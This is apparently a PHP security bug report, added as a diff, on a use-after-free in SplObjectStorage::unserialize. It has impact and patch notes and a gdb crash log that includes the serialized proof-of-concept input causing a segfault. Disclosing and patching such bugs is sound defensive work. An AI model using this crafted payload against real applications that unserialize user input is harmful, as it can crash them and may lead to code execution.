@@ -1,0 +1,98 @@
+Summary
+-------
+
+By correctly crafting their input to `unserialize` an attacker can cause the
+`SPL_METHOD(SplObjectStorage, unserialize)` to pass destroyed `zval`s to
+`php_var_unserialize`. This is the same insecure pattern, and has similar root
+causes, to #71311, and so I won't go into too much detail here.
+
+Impact
+------
+
+This vulnerability can potentially be leveraged to achieve code execution. Any
+application that calls `unserialize` on user provided data is potentially
+vulnerable.
+
+Patch
+-----
+
+The attached patch modifies `SPL_METHOD(SplObjectStorage, unserialize)` to mark
+the destroyed `zval`s as undefined, immediately after they are destroyed. As
+described in #71311, to fix the root cause a bug in `php_var_unserialize_ex`
+should also be fixed. See that issue for the mentioned patch.
+
+Crash Details
+-------------
+$ gdb -q ./sapi/cli/php
+
+(gdb) r deserialise.php poc.sz
+Starting program: /home/sean/Git/php-src/sapi/cli/php deserialise.php poc.sz
+C:16:"SplObjectStorage":113:{x:i:2;O:8:"stdClass":0:{},a:2:{s:4:"prev";i:2;s:4:"next";O:8:"stdClass":0:{}};r:7;,R:2;s:4:"next";;r:3;};m:a:0:{}}
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000084e570 in zend_mm_alloc_small (bin_num=6, size=56, heap=0x7ffff4800040) at /home/sean/Git/php-src/Zend/zend_alloc.c:1291
+1291			heap->free_slot[bin_num] = p->next_free_slot;
+
+(gdb) bt
+#0  0x000000000084e570 in zend_mm_alloc_small (bin_num=6, size=56, heap=0x7ffff4800040) at /home/sean/Git/php-src/Zend/zend_alloc.c:1291
+#1  _emalloc_56 () at /home/sean/Git/php-src/Zend/zend_alloc.c:2361
+#2  0x0000000000897dd2 in _array_init (arg=0x7fffffff9380, size=0) at /home/sean/Git/php-src/Zend/zend_API.c:1063
+#3  0x00000000008cbaa5 in zend_fetch_debug_backtrace (return_value=0x7fffffff9410, skip_last=0, options=0, limit=0)
+    at /home/sean/Git/php-src/Zend/zend_builtin_functions.c:2528
+#4  0x00000000008d3fa2 in zend_default_exception_new_ex (class_type=0x11fdb10, skip_top_traces=0) at /home/sean/Git/php-src/Zend/zend_exceptions.c:213
+#5  0x00000000008d411e in zend_default_exception_new (class_type=0x11fdb10) at /home/sean/Git/php-src/Zend/zend_exceptions.c:236
+#6  0x0000000000898ea3 in _object_and_properties_init (arg=0x7fffffff94e0, class_type=0x11fdb10, properties=0x0) at /home/sean/Git/php-src/Zend/zend_API.c:1304
+#7  0x0000000000898ee7 in _object_init_ex (arg=0x7fffffff94e0, class_type=0x11fdb10) at /home/sean/Git/php-src/Zend/zend_API.c:1312
+#8  0x00000000008dbf98 in zend_throw_exception (exception_ce=0x11fdb10, message=0x7ffff486a140 "Error at offset 87 of 113 bytes", code=0)
+    at /home/sean/Git/php-src/Zend/zend_exceptions.c:878
+#9  0x00000000008dc0f0 in zend_throw_exception_ex (exception_ce=0x11fdb10, code=0, format=0xdff510 "Error at offset %pd of %d bytes")
+    at /home/sean/Git/php-src/Zend/zend_exceptions.c:902
+#10 0x00000000006e035d in zim_spl_SplObjectStorage_unserialize (execute_data=0x7ffff48141f0, return_value=0x7fffffff9b10)
+    at /home/sean/Git/php-src/ext/spl/spl_observer.c:854
+#11 0x0000000000875e3d in zend_call_function (fci=0x7fffffff9b70, fci_cache=0x7fffffff9b40) at /home/sean/Git/php-src/Zend/zend_execute_API.c:879
+#12 0x00000000008d1655 in zend_call_method (object=0x7ffff4814130, obj_ce=0x1229bf0, fn_proxy=0x1229d38, function_name=0xe36405 "unserialize", function_name_len=11,
+    retval_ptr=0x0, param_count=1, arg1=0x7fffffff9c70, arg2=0x0) at /home/sean/Git/php-src/Zend/zend_interfaces.c:104
+#13 0x00000000008d2834 in zend_user_unserialize (object=0x7ffff4814130, ce=0x1229bf0,
+    buf=0x7ffff4877335 "x:i:2;O:8:\"stdClass\":0:{},a:2:{s:4:\"prev\";i:2;s:4:\"next\";O:8:\"stdClass\":0:{}};r:7;,R:2;s:4:\"next\";;r:3;};m:a:0:{}}\n", buf_len=113,
+    data=0x7fffffffa148) at /home/sean/Git/php-src/Zend/zend_interfaces.c:460
+#14 0x00000000007b0526 in object_custom (rval=0x7ffff4814130, p=0x7fffffffa140, max=0x7ffff48773a8 "", var_hash=0x7fffffffa148, classes=0x0, ce=0x1229bf0)
+    at ext/standard/var_unserializer.re:425
+#15 0x00000000007b21bd in php_var_unserialize_ex (rval=0x7ffff4814130, p=0x7fffffffa140, max=0x7ffff48773a8 "", var_hash=0x7fffffffa148, classes=0x0)
+    at ext/standard/var_unserializer.re:844
+#16 0x000000000079b069 in zif_unserialize (execute_data=0x7ffff4814180, return_value=0x7ffff4814130) at /home/sean/Git/php-src/ext/standard/var.c:1038
+#17 0x0000000000924373 in ZEND_DO_ICALL_SPEC_HANDLER () at /home/sean/Git/php-src/Zend/zend_vm_execute.h:586
+#18 0x0000000000922aee in execute_ex (ex=0x7ffff4814030) at /home/sean/Git/php-src/Zend/zend_vm_execute.h:414
+#19 0x0000000000923464 in zend_execute (op_array=0x7ffff4882000, return_value=0x0) at /home/sean/Git/php-src/Zend/zend_vm_execute.h:458
+#20 0x00000000008931c5 in zend_execute_scripts (type=8, retval=0x0, file_count=3) at /home/sean/Git/php-src/Zend/zend.c:1427
+#21 0x00000000007e2400 in php_execute_script (primary_file=0x7fffffffcb30) at /home/sean/Git/php-src/main/main.c:2484
+#22 0x0000000000a0109e in do_cli (argc=3, argv=0x1169530) at /home/sean/Git/php-src/sapi/cli/php_cli.c:974
+#23 0x0000000000a02462 in main (argc=3, argv=0x1169530) at /home/sean/Git/php-src/sapi/cli/php_cli.c:1345
+(gdb) x/i $rip
+=> 0x84e570 <_emalloc_56+225>:	mov    (%rax),%rdx
+(gdb) i r
+rax            0xc0047ffff4857380	-4610419381224770688
+rbx            0x0	0
+rcx            0x18	24
+rdx            0xa	10
+rsi            0x0	0
+rdi            0x7fffffff9380	140737488327552
+rbp            0x7fffffff9270	0x7fffffff9270
+rsp            0x7fffffff9240	0x7fffffff9240
+r8             0x7fffffff8b88	140737488325512
+r9             0x0	0
+r10            0x22b	555
+r11            0x7ffff70b3e30	140737338097200
+r12            0x423020	4337696
+r13            0x7fffffffdeb0	140737488346800
+r14            0x7ffff4814030	140737295499312
+r15            0x7ffff4889220	140737295979040
+rip            0x84e570	0x84e570 <_emalloc_56+225>
+eflags         0x10206	[ PF IF RF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+
+EOF
